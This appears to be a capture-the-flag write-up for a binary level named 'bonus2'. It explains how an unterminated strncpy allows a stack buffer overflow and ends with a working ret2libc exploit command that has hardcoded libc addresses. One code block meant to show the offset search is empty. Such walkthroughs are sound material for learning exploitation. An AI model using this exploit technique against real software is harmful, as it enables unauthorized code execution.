We start by opening the file in [dogbolt](https://dogbolt.org/).
Here we see that we will use the fact `strncpy` don't put `\0` in some case.

Here we will overflow using the same method as in the bonus0.
We see that 40 char form `argv[1]` is copied by a `strncpy`
And 32 char is copied from `argv[2]`

So we will try to make the program copy `argv[1]` and `argv[2]` in the first `strncpy`:
[ARGV 1][ARGV 2][ARGV2]

We find the offset to overflow :
```Shell

```

Since we have more than 12 bytes we can try to use a Ret 2 libc.
A Ret 2 libc is compose of :
[Address of system][return address of system][command to execute]


First arg:           Second arg :
[Fill the first ARG]|[Offset to overflow][Ret 2 libc]
```Shell
./bonus2 $(python -c 'print "A"* 40') $(python -c 'print "\x90" * 18 + "\x60\xb0\xe6\xb7" + "ABCD" + "\x58\xcc\xf8\xb7"')
```